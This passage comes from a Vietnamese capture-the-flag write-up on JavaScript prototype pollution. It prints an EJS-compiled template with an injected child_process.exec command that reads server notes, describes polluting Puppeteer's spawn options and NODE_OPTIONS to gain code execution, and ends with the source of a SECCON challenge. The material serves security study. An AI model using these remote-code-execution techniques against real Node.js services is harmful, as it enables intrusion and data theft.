ch·∫°y code c·ªßa m√¨nh. <code>escapeFn</code> c·∫ßn c√≥ ki·ªÉu Function n√™n c√≥ th·ªÉ cho n√≥ b·∫±ng m·ªôt function b·∫•t k·ª≥ (<code>console.log</code>)</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">rethrow <span class="token operator">=</span> rethrow <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token function">rethrow</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> str<span class="token punctuation">,</span> flnm<span class="token punctuation">,</span> lineno<span class="token punctuation">,</span> esc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">var</span> lines <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&#39;\n&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token keyword">var</span> start <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lineno <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token keyword">var</span> end <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>lines<span class="token punctuation">.</span>length<span class="token punctuation">,</span> lineno <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token keyword">var</span> filename <span class="token operator">=</span> <span class="token function">esc</span><span class="token punctuation">(</span>flnm<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token comment">// Error context</span></span>
<span class="line">  <span class="token keyword">var</span> context <span class="token operator">=</span> lines<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">line<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span><span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">var</span> curr <span class="token operator">=</span> i <span class="token operator">+</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">return</span> <span class="token punctuation">(</span>curr <span class="token operator">==</span> lineno <span class="token operator">?</span> <span class="token string">&#39; &gt;&gt; &#39;</span> <span class="token operator">:</span> <span class="token string">&#39;    &#39;</span><span class="token punctuation">)</span></span>
<span class="line">      <span class="token operator">+</span> curr</span>
<span class="line">      <span class="token operator">+</span> <span class="token string">&#39;| &#39;</span></span>
<span class="line">      <span class="token operator">+</span> line<span class="token punctuation">;</span></span>
<span class="line">  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&#39;\n&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">  <span class="token comment">// Alter exception message</span></span>
<span class="line">  err<span class="token punctuation">.</span>path <span class="token operator">=</span> filename<span class="token punctuation">;</span></span>
<span class="line">  err<span class="token punctuation">.</span>message <span class="token operator">=</span> <span class="token punctuation">(</span>filename <span class="token operator">||</span> <span class="token string">&#39;ejs&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;:&#39;</span></span>
<span class="line">    <span class="token operator">+</span> lineno <span class="token operator">+</span> <span class="token string">&#39;\n&#39;</span></span>
<span class="line">    <span class="token operator">+</span> context <span class="token operator">+</span> <span class="token string">&#39;\n\n&#39;</span></span>
<span class="line">    <span class="token operator">+</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">  <span class="token keyword">throw</span> err<span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">;</span></span>
<span class="line">escapeFn <span class="token operator">=</span> escapeFn <span class="token operator">||</span> console<span class="token punctuation">.</span>log<span class="token punctuation">;</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;child_process&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&#39;tail -n +1 notes/* | grep bi0s &gt; notes/flag.json&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">var</span> __line <span class="token operator">=</span> <span class="token number">1</span></span>
<span class="line">  <span class="token punctuation">,</span> __lines <span class="token operator">=</span> <span class="token string">&quot;&lt;!-- views/create.ejs --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;Create Note&lt;/title&gt;\n  &lt;style&gt;\n    body {\n      background-color: #303030; /* Dark background color */\n      color: #ffffff; /* Text color */\n      font-family: &#39;Arial&#39;, sans-serif;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n      height: 100vh;\n      margin: 0;\n    }\n\n    .card {\n      background-color: #444444; /* Card background color */\n      border-radius: 8px;\n      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);\n      padding: 20px;\n      width: 400px;\n      box-sizing: border-box;\n    }\n\n    h1, h2 {\n      color: #ffffff; /* Heading text color */\n      text-align: center;\n    }\n\n    form {\n      max-width: 100%;\n      margin-top: 20px;\n    }\n\n    label {\n      color: #ffffff; /* Label text color */\n    }\n\n    input[type=\&quot;text\&quot;], textarea {\n      width: 100%;\n      padding: 10px;\n      margin: 8px 0;\n      box-sizing: border-box;\n      background-color: #333333; /* Input background color */\n      color: #ffffff; /* Input text color */\n      border: 1px solid #ffffff; /* Input border color */\n    }\n\n    input[type=\&quot;button\&quot;] {\n      background-color: #ffffff; /* Button background color */\n      color: #303030; /* Button text color */\n      padding: 10px 15px;\n      border: none;\n      cursor: pointer;\n      width: 100%;\n    }\n\n    input[type=\&quot;button\&quot;]:hover {\n      background-color: #555555; /* Button background color on hover */\n    }\n\n    #message {\n      color: #ff0000; /* Error message color */\n      margin-top: 10px;\n      text-align: center;\n    }\n\n    #noteList {\n      list-style-type: none;\n      padding: 0;\n    }\n\n    #noteList li {\n      margin-bottom: 8px;\n    }\n\n    #noteList a {\n      text-decoration: none;\n      color: #ffffff; /* Link text color */\n    }\n\n    #noteList a:hover {\n      text-decoration: underline;\n    }\n  &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=\&quot;card\&quot;&gt;\n  &lt;h1&gt;Create a New Note&lt;/h1&gt;\n  &lt;form id=\&quot;noteForm\&quot;&gt;\n    &lt;label for=\&quot;title\&quot;&gt;Title:&lt;/label&gt;&lt;br&gt;\n    &lt;input type=\&quot;text\&quot; id=\&quot;title\&quot; name=\&quot;title\&quot; required&gt;&lt;br&gt;\n    &lt;label for=\&quot;content\&quot;&gt;Content:&lt;/label&gt;&lt;br&gt;\n    &lt;textarea id=\&quot;content\&quot; name=\&quot;content\&quot; rows=\&quot;4\&quot; cols=\&quot;50\&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;\n    &lt;input type=\&quot;button\&quot; value=\&quot;Create Note\&quot; onclick=\&quot;submitNote()\&quot;&gt;\n  &lt;/form&gt;\n\n&lt;div id=\&quot;message\&quot; style=\&quot;color: red;\&quot;&gt;&lt;/div&gt;\n\n&lt;script&gt;\nfunction addItemToList(item) {\n  const noteList = document.getElementById(&#39;noteList&#39;);\n  const listItem = document.createElement(&#39;li&#39;);\n\n  const link = document.createElement(&#39;a&#39;);\n  link.href = `/view/${item.Noteid}`; \n  link.textContent = item.Noteid; \n  listItem.appendChild(link);\n\n  noteList.appendChild(listItem);\n}\n\nfunction submitNote() {\n  const title = document.getElementById(\&quot;title\&quot;).value;\n  const content = document.getElementById(\&quot;content\&quot;).value;\n\n  const noteData = { title, content };\n\n  fetch(\&quot;/create\&quot;, {\n    method: \&quot;POST\&quot;,\n    headers: {\n      \&quot;Content-Type\&quot;: \&quot;application/json\&quot;,\n    },\n    body: JSON.stringify(noteData),\n  })\n    .then((response) =&gt; response.json())\n    .then((data) =&gt; {\n      if (data.Message) {\n        document.getElementById(\&quot;message\&quot;).innerHTML = data.Message;\n        if (data.Noteid){\n          addItemToList(data);\n        }\n      } \n    })\n    .catch((error) =&gt; {\n      console.error(\&quot;error:\&quot;, error);\n      document.getElementById(\&quot;message\&quot;).innerText = &#39;Error&#39;;\n    });\n\n}\n&lt;/script&gt;\n\n  &lt;% if (Message) { %&gt;\n    &lt;p&gt;&lt;%= Message %&gt;&lt;/p&gt;\n  &lt;% } %&gt;\n  &lt;h2&gt;Created Notes:&lt;/h2&gt;\n  &lt;ul id=\&quot;noteList\&quot; style=\&quot;text-align:center\&quot;&gt;\n    &lt;% for (const noteId of noteList) { %&gt;\n      &lt;li&gt;&lt;a href=\&quot;/view/&lt;%= noteId %&gt;\&quot;&gt;&lt;%= noteId %&gt;&lt;/a&gt;&lt;/li&gt;\n    &lt;% } %&gt;\n  &lt;/ul&gt;\n  &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span></span>
<span class="line">  <span class="token punctuation">,</span> __filename <span class="token operator">=</span> <span class="token string">&quot;/tmp/note/src/views/create.ejs&quot;</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">try</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">var</span> __output <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token keyword">function</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> s <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> __output <span class="token operator">+=</span> s <span class="token punctuation">}</span></span>
<span class="line">  <span class="token keyword">with</span> <span class="token punctuation">(</span>locals <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;!-- views/create.ejs --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;Create Note&lt;/title&gt;\n  &lt;style&gt;\n    body {\n      background-color: #303030; /* Dark background color */\n      color: #ffffff; /* Text color */\n      font-family: &#39;Arial&#39;, sans-serif;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n      height: 100vh;\n      margin: 0;\n    }\n\n    .card {\n      background-color: #444444; /* Card background color */\n      border-radius: 8px;\n      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);\n      padding: 20px;\n      width: 400px;\n      box-sizing: border-box;\n    }\n\n    h1, h2 {\n      color: #ffffff; /* Heading text color */\n      text-align: center;\n    }\n\n    form {\n      max-width: 100%;\n      margin-top: 20px;\n    }\n\n    label {\n      color: #ffffff; /* Label text color */\n    }\n\n    input[type=\&quot;text\&quot;], textarea {\n      width: 100%;\n      padding: 10px;\n      margin: 8px 0;\n      box-sizing: border-box;\n      background-color: #333333; /* Input background color */\n      color: #ffffff; /* Input text color */\n      border: 1px solid #ffffff; /* Input border color */\n    }\n\n    input[type=\&quot;button\&quot;] {\n      background-color: #ffffff; /* Button background color */\n      color: #303030; /* Button text color */\n      padding: 10px 15px;\n      border: none;\n      cursor: pointer;\n      width: 100%;\n    }\n\n    input[type=\&quot;button\&quot;]:hover {\n      background-color: #555555; /* Button background color on hover */\n    }\n\n    #message {\n      color: #ff0000; /* Error message color */\n      margin-top: 10px;\n      text-align: center;\n    }\n\n    #noteList {\n      list-style-type: none;\n      padding: 0;\n    }\n\n    #noteList li {\n      margin-bottom: 8px;\n    }\n\n    #noteList a {\n      text-decoration: none;\n      color: #ffffff; /* Link text color */\n    }\n\n    #noteList a:hover {\n      text-decoration: underline;\n    }\n  &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=\&quot;card\&quot;&gt;\n  &lt;h1&gt;Create a New Note&lt;/h1&gt;\n  &lt;form id=\&quot;noteForm\&quot;&gt;\n    &lt;label for=\&quot;title\&quot;&gt;Title:&lt;/label&gt;&lt;br&gt;\n    &lt;input type=\&quot;text\&quot; id=\&quot;title\&quot; name=\&quot;title\&quot; required&gt;&lt;br&gt;\n    &lt;label for=\&quot;content\&quot;&gt;Content:&lt;/label&gt;&lt;br&gt;\n    &lt;textarea id=\&quot;content\&quot; name=\&quot;content\&quot; rows=\&quot;4\&quot; cols=\&quot;50\&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;\n    &lt;input type=\&quot;button\&quot; value=\&quot;Create Note\&quot; onclick=\&quot;submitNote()\&quot;&gt;\n  &lt;/form&gt;\n\n&lt;div id=\&quot;message\&quot; style=\&quot;color: red;\&quot;&gt;&lt;/div&gt;\n\n&lt;script&gt;\nfunction addItemToList(item) {\n  const noteList = document.getElementById(&#39;noteList&#39;);\n  const listItem = document.createElement(&#39;li&#39;);\n\n  const link = document.createElement(&#39;a&#39;);\n  link.href = `/view/${item.Noteid}`; \n  link.textContent = item.Noteid; \n  listItem.appendChild(link);\n\n  noteList.appendChild(listItem);\n}\n\nfunction submitNote() {\n  const title = document.getElementById(\&quot;title\&quot;).value;\n  const content = document.getElementById(\&quot;content\&quot;).value;\n\n  const noteData = { title, content };\n\n  fetch(\&quot;/create\&quot;, {\n    method: \&quot;POST\&quot;,\n    headers: {\n      \&quot;Content-Type\&quot;: \&quot;application/json\&quot;,\n    },\n    body: JSON.stringify(noteData),\n  })\n    .then((response) =&gt; response.json())\n    .then((data) =&gt; {\n      if (data.Message) {\n        document.getElementById(\&quot;message\&quot;).innerHTML = data.Message;\n        if (data.Noteid){\n          addItemToList(data);\n        }\n      } \n    })\n    .catch((error) =&gt; {\n      console.error(\&quot;error:\&quot;, error);\n      document.getElementById(\&quot;message\&quot;).innerText = &#39;Error&#39;;\n    });\n\n}\n&lt;/script&gt;\n\n  &quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">145</span></span>
<span class="line">    <span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>Message<span class="token punctuation">)</span> <span class="token punctuation">{</span> </span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\n    &lt;p&gt;&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">146</span></span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> Message <span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;/p&gt;\n  &quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">147</span></span>
<span class="line">    <span class="token punctuation">;</span>  <span class="token punctuation">}</span> </span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\n  &lt;h2&gt;Created Notes:&lt;/h2&gt;\n  &lt;ul id=\&quot;noteList\&quot; style=\&quot;text-align:center\&quot;&gt;\n    &quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">150</span></span>
<span class="line">    <span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> noteId <span class="token keyword">of</span> noteList<span class="token punctuation">)</span> <span class="token punctuation">{</span> </span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\n      &lt;li&gt;&lt;a href=\&quot;/view/&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">151</span></span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> noteId <span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\&quot;&gt;&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> noteId <span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;/a&gt;&lt;/li&gt;\n    &quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">152</span></span>
<span class="line">    <span class="token punctuation">;</span>  <span class="token punctuation">}</span> </span>
<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\n  &lt;/ul&gt;\n  &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">157</span></span>
<span class="line">  <span class="token punctuation">}</span></span>
<span class="line">  <span class="token keyword">return</span> __output<span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token function">rethrow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> __lines<span class="token punctuation">,</span> __filename<span class="token punctuation">,</span> __line<span class="token punctuation">,</span> escapeFn<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>Nh∆∞ v·∫≠y, sau khi xem m·ªôt note b·∫•t k·ª≥ hay GET ƒë·∫øn <code>/create</code>, h√†m <code>res.render()</code> s·∫Ω ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng EJS ƒë·ªÉ render template, options prototype ƒë∆∞·ª£c truy·ªÅn v√†o s·∫Ω execute code c·ªßa m√¨nh.</p><p>Tr∆∞·ªõc ti√™n g√°n cho <code>opts.client</code> l√† truthy value. Ti·∫øp t·ª•c g√°n cho <code>escapeFunction</code>. V√¨ c√≥ th·ªÉ RCE, m√¨nh c√≥ c√≥ th·ªÉ ƒë·ªçc t·∫•t c·∫£ c√°c notes v√† t√¨m note c√≥ flag, sau ƒë√≥ t·∫°o note m·ªõi ch·ªâ ch·ª©a flag ƒë√≥ v·ªõi t√™n c·ªë ƒë·ªãnh (<code>flag.json</code>). Options c·ªßa EJS ƒë√£ ƒë∆∞·ª£c g√°n v√†o, gi·ªù ta ch·ªâ c·∫ßn cho h√†m <code>res.render()</code> ch·∫°y, file note m·ªõi v·ªõi t√™n <code>flag.json</code> s·∫Ω ƒë∆∞·ª£c sinh ra, view note ƒë√≥ v√† l·∫•y flag üòô <img src="/assets/prototype-pollution-bios-11-DtvPFIpj.png" alt="alt text"></p><h5 id="rce-voi-puppeteer" tabindex="-1"><a class="header-anchor" href="#rce-voi-puppeteer"><span>RCE v·ªõi Puppeteer</span></a></h5><p>Khi GET <code>/healthcheck</code>, server s·∫Ω ch·∫°y bot v·ªõi Puppeteer, t·∫°o m·ªôt process m·ªõi, ch·∫°y browser headless v√† truy c·∫≠p v√†o trang <code>/view/Healthcheck</code>. <img src="/assets/prototype-pollution-bios-12-XE0oKGlM.png" alt="alt text"> Khi Puppeteer launch browser m·ªõi, c≈©ng ƒë·ªìng th·ªùi s·ª≠ d·ª•ng <code>child_process.spawn()</code> v·ªõi 3 args l√† <code>detached</code>, <code>env</code>, <code>stdio</code>. <img src="/assets/prototype-pollution-bios-13-CvP4z0ON.png" alt="alt text"> Tuy nhi√™n h√†m <code>spawn()</code> c√≤n nh·ªØng options kh√°c nh∆∞ <code>shell</code>, <code>argv0</code>, ta c√≥ th·ªÉ pollute c√°c attribute n√†y ƒë·ªÉ g·ªçi shell ch·∫°y l·ªánh c·ªßa m√¨nh.</p><p>Ta th·ª≠ g√°n gi√° tr·ªã cho 2 options n√≥i tr√™n <img src="/assets/prototype-pollution-bios-14-LcnDDfyW.png" alt="alt text"> Server s·∫Ω ch·∫°y l·ªánh nh∆∞ sau <code>/bin/sh echo hehehe -c this.#executablePath this.#args</code>. Nh∆∞ v·∫≠y, ta c√≥ th·ªÉ thay ƒë·ªïi <code>shell</code> th√†nh <code>/proc/self/exe</code> -&gt; <code>node</code> v√† RCE v·ªõi <code>NODE_OPTIONS</code></p><p>ƒê·∫ßu ti√™n g√°n gi√° tr·ªã cho <code>shell</code> th√†nh <code>/proc/self/exe</code>, ti·∫øp t·ª•c g√°n gi√° tr·ªã cho <code>argv0</code> l√† ƒëo·∫°n javascript c·∫ßn execute. Cu·ªëi c√πng l√† ch·ªânh <code>NODE_OPTIONS</code> l√† <code>--require /proc/self/cmdline</code> ƒë·ªÉ ch·∫°y l·ªánh c·ªßa m√¨nh. Sau khi pollute c√°c options th√¨ GET ƒë·∫øn <code>/healthcheck</code> ƒë·ªÉ Puppeteer spawn process m·ªõi. Khi ƒë√≥, command m√¨nh ƒë∆∞a v√†o s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán, gi·ªù ch·ªâ c·∫ßn m·ªü <code>/view/flag</code> l·∫•y flag</p><h3 id="seccon13-pp4" tabindex="-1"><a class="header-anchor" href="#seccon13-pp4"><span>seccon13/pp4</span></a></h3><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">INFO</p><blockquote><p>Author: Ark</p></blockquote><details class="custom-container details"><summary class="custom-container-title">Source</summary><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token hashbang comment">#!/usr/local/bin/node</span></span>
<span class="line"><span class="token keyword">const</span> readline <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;node:readline/promises&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">const</span> rl <span class="token operator">=</span> readline<span class="token punctuation">.</span><span class="token function">createInterface</span><span class="token punctuation">(</span><span class="token punctuation">{</span></span>
<span class="line">  <span class="token literal-property property">input</span><span class="token operator">:</span> process<span class="token punctuation">.</span>stdin<span class="token punctuation">,</span></span>
<span class="line">  <span class="token literal-property property">output</span><span class="token operator">:</span> process<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> value <span class="token operator">==</span> <span class="token string">&quot;object&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>key <span class="token keyword">in</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span> result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span></span>
<span class="line">      <span class="token function">clone</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> result<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">      result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">}</span></span>
<span class="line">  <span class="token keyword">return</span> result<span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token comment">// Step 1: Prototype Pollution</span></span>
<span class="line">  <span class="token keyword">const</span> json <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> rl<span class="token punctuation">.</span><span class="token function">question</span><span class="token punctuation">(</span><span class="token string">&quot;Input JSON: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">  <span class="token comment">// Step 2: JSF**k with 4 characters</span></span>
<span class="line">  <span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> rl<span class="token punctuation">.</span><span class="token function">question</span><span class="token punctuation">(</span><span class="token string">&quot;Input code: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span>size <span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Too many :(&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">return</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token punctuation">}</span></span>
<span class="line">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">finally</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> rl<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
